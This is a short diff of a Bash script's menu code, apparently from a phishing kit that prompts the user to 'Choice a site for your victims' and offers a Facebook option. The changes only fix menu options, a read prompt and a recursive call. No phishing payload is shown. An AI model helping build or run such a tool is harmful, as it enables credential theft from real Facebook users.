@@ -263,7 +263,6 @@ site_fb() {
 	cat <<- EOF
 
 		[01] My Facebook Page 
-		[00]  Exit
 	EOF
 
 	read -r "Select an option :"
@@ -285,10 +284,10 @@ ch_main_menu() {
 		Choice a site for your victims 
 
 		[01] Facebook 
-
+		[00] exit
 		EOF
 	
-	read -r "Select an option : ${BLUE}"
+	read -p	"Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		site_fb
@@ -296,7 +295,7 @@ ch_main_menu() {
 		exit_msg
 	else
 		echo -ne "Invalid Option, Try Again..."
-		{ sleep 1; main_menu; }
+		{ sleep 1; ch_main_menu; }
 	fi
 }
 
